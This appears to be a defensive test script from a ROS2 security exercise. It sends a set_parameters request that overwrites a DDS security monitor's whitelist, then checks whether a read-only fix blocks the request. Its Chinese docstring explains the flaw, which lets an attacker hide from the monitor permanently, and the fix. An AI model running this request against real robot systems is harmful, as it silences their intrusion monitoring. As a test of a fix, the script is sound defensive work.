#!/usr/bin/env python3
"""攻擊 N14 — ros2 /set_parameters 改 monitor whitelist 永久隱身.

藍方自己預判的攻擊。ROS2 每個 node 預設都 expose /<node>/set_parameters service。
L1 攻擊者只需要在同 LAN 用 DDS service call 就能改參數，不需要 secret。

漏洞：
    monitor 用 self.declare_parameter('whitelist', [...]) 不加 read_only descriptor
    → /dds_security_monitor/set_parameters 接受任意 client 改 whitelist
    → attacker 把自己加進 whitelist → monitor 從此不會 alert 他

藍方修補：
    所有 monitor 安全敏感參數一律 ParameterDescriptor(read_only=True)
    /set_parameters 對 read_only param 會回 successful=False

驗證方式：
    試圖改 whitelist 為 ['attacker_only']
    若 success=True → 修補失敗
    若 success=False + reason 包含 'read-only' → 修補成功
"""
import sys
import time
import rclpy
from rclpy.node import Node
from rcl_interfaces.srv import SetParameters
from rcl_interfaces.msg import Parameter, ParameterValue, ParameterType


class WhitelistHijacker(Node):

    def __init__(self):
        super().__init__('attacker_param_hijack')
        self._client = self.create_client(
            SetParameters, '/dds_security_monitor/set_parameters'
        )

    def try_overwrite_whitelist(self):
        if not self._client.wait_for_service(timeout_sec=5.0):
            self.get_logger().error('❌ 找不到 /dds_security_monitor/set_parameters service')
            return
        # 構造請求：把 whitelist 整個換成「只有 attacker_only_node」
        req = SetParameters.Request()
        p = Parameter()
        p.name = 'whitelist'
        v = ParameterValue()
        v.type = ParameterType.PARAMETER_STRING_ARRAY
        v.string_array_value = ['attacker_only_node']
        p.value = v
        req.parameters = [p]
        self.get_logger().error('☠️ 對 monitor 發 /set_parameters: whitelist = ["attacker_only_node"]')
        future = self._client.call_async(req)
        rclpy.spin_until_future_complete(self, future, timeout_sec=5.0)
        if not future.done():
            self.get_logger().error('❌ service call timeout')
            return
        results = future.result().results
        for r in results:
            if r.successful:
                self.get_logger().error(
                    f'✗✗✗ ATTACK SUCCEEDED — whitelist 已被改！monitor 從此看不見其他 attacker'
                )
            else:
                self.get_logger().warn(
                    f'✓ 修補成功 — set_parameters refused: {r.reason!r}'
                )


def main():
    rclpy.init()
    node = WhitelistHijacker()
    try:
        node.try_overwrite_whitelist()
    finally:
        time.sleep(1)
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
